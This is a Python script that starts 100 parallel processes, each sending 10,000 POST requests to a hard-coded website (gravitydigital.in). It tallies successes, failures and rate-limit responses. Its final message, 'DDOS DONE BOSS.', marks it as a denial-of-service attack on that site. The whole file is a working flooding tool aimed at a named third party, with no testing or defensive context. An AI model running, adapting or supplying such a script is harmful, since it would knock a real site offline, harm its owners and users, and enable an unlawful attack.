import multiprocessing
import requests
import time


NUM_PROCESSES = 100

NUM_REQUESTS_PER_PROCESS = 10000

URL = "https://gravitydigital.in/"

request_count = multiprocessing.Value('i', 0)
success_count = multiprocessing.Value('i', 0)
failure_count = multiprocessing.Value('i', 0)

def make_requests(num_requests, request_count, success_count, failure_count):
    for _ in range(num_requests):
        with request_count.get_lock():
            request_count.value += 1

        try:
            response = requests.post(URL)
            if response.status_code == 200:
                with success_count.get_lock():
                    success_count.value += 1
            elif response.status_code == 429:
                print("Received 429 Too Many Requests, sleeping for 3 seconds...")
                time.sleep(3)
                with failure_count.get_lock():
                    failure_count.value += 1
            else:
                with failure_count.get_lock():
                    failure_count.value += 1
                print(f"Request failed with status code: {response.status_code}, Response: {response.text}")
        except requests.exceptions.RequestException as e:
            with failure_count.get_lock():
                failure_count.value += 1
            print(f"Request exception: {e}")

def print_stats(request_count, success_count, failure_count):
    while True:
        time.sleep(5)
        print(f"Requests sent: {request_count.value}, Success: {success_count.value}, Failure: {failure_count.value}")

if __name__ == '__main__':
    multiprocessing.freeze_support()

    processes = []

    stats_process = multiprocessing.Process(target=print_stats, args=(request_count, success_count, failure_count))
    stats_process.start()

    for _ in range(NUM_PROCESSES):
        process = multiprocessing.Process(target=make_requests, args=(NUM_REQUESTS_PER_PROCESS, request_count, success_count, failure_count))
        processes.append(process)
        process.start()

    for process in processes:
        process.join()

    stats_process.terminate()
    print("DDOS DONE BOSS.")
